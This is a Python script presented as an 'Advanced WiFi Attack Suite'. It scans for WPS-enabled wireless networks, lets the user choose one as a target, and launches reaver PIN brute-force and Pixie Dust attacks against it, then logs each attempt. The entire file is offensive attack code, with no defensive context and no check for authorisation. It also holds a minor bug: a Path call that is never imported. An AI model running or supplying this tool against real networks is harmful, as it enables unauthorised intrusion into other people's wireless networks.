
#!/usr/bin/env python3
# wifiteX.py - Advanced All-in-One Wi-Fi Testing Tool

import subprocess
import os
import re
import time
import json
from datetime import datetime
from colorama import Fore, Style, init
init(autoreset=True)

LOG_FILE = "wifitex_results.json"

def banner():
    print(Fore.CYAN + """
██╗    ██╗██╗███████╗██╗████████╗███████╗██╗  ██╗
██║    ██║██║██╔════╝██║╚══██╔══╝██╔════╝╚██╗██╔╝
██║ █╗ ██║██║█████╗  ██║   ██║   █████╗   ╚███╔╝ 
██║███╗██║██║██╔══╝  ██║   ██║   ██╔══╝   ██╔██╗ 
╚███╔███╔╝██║██║     ██║   ██║   ███████╗██╔╝ ██╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
            Advanced WiFi Attack Suite vX
    """ + Style.RESET_ALL)

def scan_networks():
    print(Fore.YELLOW + "[*] Scanning for Wi-Fi networks with WPS enabled...")
    cmd = ["timeout", "15", "wash", "-i", "wlan0mon"]
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()
        lines = result.strip().split("\n")[2:]
        networks = []
        for line in lines:
            parts = re.split(r'\s{2,}', line.strip())
            if len(parts) >= 5:
                bssid, channel, power = parts[0], parts[1], parts[2]
                networks.append({"bssid": bssid, "channel": channel, "power": power})
        return sorted(networks, key=lambda x: int(x["power"]), reverse=True)
    except Exception as e:
        print(Fore.RED + f"[!] Error during scanning: {e}")
        return []

def show_networks(networks):
    print(Fore.GREEN + "\n[+] Networks Found:")
    for i, net in enumerate(networks):
        print(Fore.CYAN + f"  [{i}] BSSID: {net['bssid']} | CH: {net['channel']} | Power: {net['power']}")

def select_network(networks):
    idx = input(Fore.YELLOW + "[?] Enter target number to attack: ")
    try:
        return networks[int(idx)]
    except:
        print(Fore.RED + "[!] Invalid selection.")
        return None

def run_reaver(target):
    print(Fore.YELLOW + f"[*] Launching reaver attack on {target['bssid']} (CH: {target['channel']})...")
    try:
        cmd = ["reaver", "-i", "wlan0mon", "-b", target["bssid"], "-c", target["channel"], "-vv"]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Reaver attack stopped.")

def try_pixiedust(target):
    print(Fore.YELLOW + f"[*] Trying Pixie Dust attack on {target['bssid']}...")
    cmd = ["reaver", "-i", "wlan0mon", "-b", target["bssid"], "-c", target["channel"], "--pixie-dust", "-vv"]
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(Fore.RED + f"[!] Pixie Dust failed: {e}")

def log_attack(target, method):
    result = {
        "target": target,
        "method": method,
        "timestamp": datetime.now().isoformat()
    }
    try:
        if Path(LOG_FILE).exists():
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
        else:
            data = []
        data.append(result)
        with open(LOG_FILE, "w") as f:
            json.dump(data, f, indent=2)
        print(Fore.GREEN + "[+] Attack result logged.")
    except Exception as e:
        print(Fore.RED + f"[!] Logging error: {e}")

def main():
    banner()
    networks = scan_networks()
    if not networks:
        print(Fore.RED + "[!] No networks found.")
        return

    show_networks(networks)
    target = select_network(networks)
    if not target:
        return

    run_reaver(target)
    try_pixiedust(target)
    log_attack(target, method="WPS Reaver + PixieDust")

if __name__ == "__main__":
    main()
